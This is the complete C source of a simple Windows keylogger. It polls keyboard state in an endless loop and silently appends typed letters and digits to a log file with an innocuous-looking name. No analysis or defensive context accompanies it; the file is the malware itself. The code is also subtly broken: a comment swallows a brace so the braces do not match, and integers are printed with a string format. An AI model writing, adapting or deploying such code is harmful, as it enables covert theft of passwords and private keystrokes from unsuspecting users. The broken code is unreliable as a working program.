#include<stdio.h>
#include<windows.h>
#include<Winuser.h>
  void spy(int key) {
    FILE * key_file;
    key_file = fopen("winlog.txm", "a+");
    if (key == 190 || key == 110)
      fprintf(key_file, "%s", ".");
    if (key >= 96 && key <= 105) {
      key = key - 48;
      fprintf(key_file, "%s", & key);
    }
    if (key >= 48 && key <= 59)
      fprintf(key_file, "%s", & key);
    if (key >= 65 && key <= 90) {
      if (GetKeyState(VK_CAPITAL))
        fprintf(key_file, "%s", & key);
      else {
        key = key + 32;
        fprintf(key_file, "%s", & key);
      }
    }
    fclose(key_file);
  }
int main() {
  char i;
  while (1) {
    Sleep(10);
    for (i = 48; i <= 105; i++) //the ascii values    {
      if (GetAsyncKeyState(i) == -32767) {
      spy(i);
    }
  }
}
}
